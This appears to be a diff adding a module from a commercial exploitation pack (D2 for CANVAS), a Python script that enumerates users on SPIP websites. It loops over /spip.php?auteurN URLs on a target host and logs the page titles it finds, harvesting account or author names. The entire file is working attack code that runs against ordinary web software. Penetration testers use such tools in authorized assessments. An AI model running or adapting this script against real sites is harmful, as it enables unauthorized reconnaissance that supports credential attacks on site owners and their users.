@@ -1,0 +1,92 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD Modules
+###
+import sys, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+###
+# Canvas modules
+###
+from tcpexploit import tcpexploit
+from canvasexploit import *
+
+###
+# GUI info
+###
+NAME                            = "d2sec_spip_enumuser"
+DESCRIPTION                     = "SPIP User Enumeration Tools" 
+VERSION                         = "1.0"
+DOCUMENTATION                   = {}
+DOCUMENTATION['VENDOR']         = 'SPIP'
+DOCUMENTATION["Repeatability"]  = 'Infinite'
+DOCUMENTATION['Date public']    = ''
+DOCUMENTATION['References']     = ''
+PROPERTY                        = {}
+PROPERTY['TYPE']                = 'Tools'
+PROPERTY['SITE']                = 'Remote'
+PROPERTY['ARCH']                = [ ['All'] ]
+
+DOCUMENTATION['NOTES'] = """
+"""
+
+CHANGELOG = """
+"""
+
+class theexploit(tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 80
+    self.maxuser = 10
+    self.userfile = ''
+    
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.maxuser = int(self.argsDict.get("maxuser", self.maxuser))
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
+    self.log('[D2] SPIP user enumeration %s:%s' % (self.host, self.port))
+    for i in range(1, self.maxuser+1):
+      try:
+        request  = "GET /spip.php?auteur%d HTTP/1.0\r\n" % i
+        request += "Host: %s:%d\r\n"%(self.host, self.port)
+        request += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"
+        request += "\r\n"
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        self.websend(s, request)
+        data = self.webrecv(s, 8192)
+        matches = re.search('<title>(.*)</title>', data)
+        if matches:
+          if '404' not in matches.group(1):
+            self.log(matches.group(1))
+      except:
+        continue
+    self.setInfo('[D2] %s attacking %s (done)' % (NAME, self.host))
+    return 1
+
+  def usage(self):
+  	print 'Usage: %s -t host -p port -O maxuser:10' % (sys.argv[0])
+  	return
+
+if __name__ == '__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
